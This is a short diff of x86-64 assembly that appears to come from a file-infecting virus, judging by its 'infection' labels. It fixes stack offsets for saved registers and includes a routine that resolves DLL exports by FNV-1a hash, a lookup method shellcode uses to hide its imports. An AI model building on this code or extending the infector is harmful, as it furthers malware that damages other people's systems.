@@ -4,9 +4,9 @@ section .text
 global main
    
 main:
-   mov [rsp+0x10],rsi
-   mov [rsp+8],rdi
-   mov [rsp],rbp
+   mov [rsp+0x18],rsi
+   mov [rsp+0x10],rdi
+   mov [rsp+8],rbp
    mov rbp,rsp
    sub rsp,0x40
 
@@ -74,17 +74,17 @@ infection__payload_exists:
    
 infection__end:
    add rsp,0x40
-   mov rsi,[rsp+0x10]
-   mov rdi,[rsp+8]
-   mov rbp,[rsp]
+   mov rsi,[rsp+0x18]
+   mov rdi,[rsp+0x10]
+   mov rbp,[rsp+8]
    ret
    
    ; rcx: the dll module
    ; rdx: the 32-bit fnv321a hash value to look up
 get_proc_by_hash:
-   mov [rsp],rbx
-   mov [rsp+8],rsi
-   mov [rsp+0x10],rdi
+   mov [rsp+8],rbx
+   mov [rsp+0x10],rsi
+   mov [rsp+0x18],rdi
    movsxd rax, dword [rcx+0x3c] ; e_lfanew
    mov r8d, dword [rax+rcx+0x88] ; nt_headers->OptionalHeader.DataDirectory[IMAGE_EXPORT_DIRECTORY] rva
    add r8, rcx                      ; pointer to the export directory
@@ -133,8 +133,8 @@ get_proc_by_hash__return_nullptr:
    xor rax,rax                  ; ya fucked up, you get a nullptr
 
 get_proc_by_hash__epilogue:
-   mov rbx,[rsp]
-   mov rsi,[rsp+8]
-   mov rdi,[rsp+0x10]
+   mov rbx,[rsp+8]
+   mov rsi,[rsp+0x10]
+   mov rdi,[rsp+0x18]
    ret
    
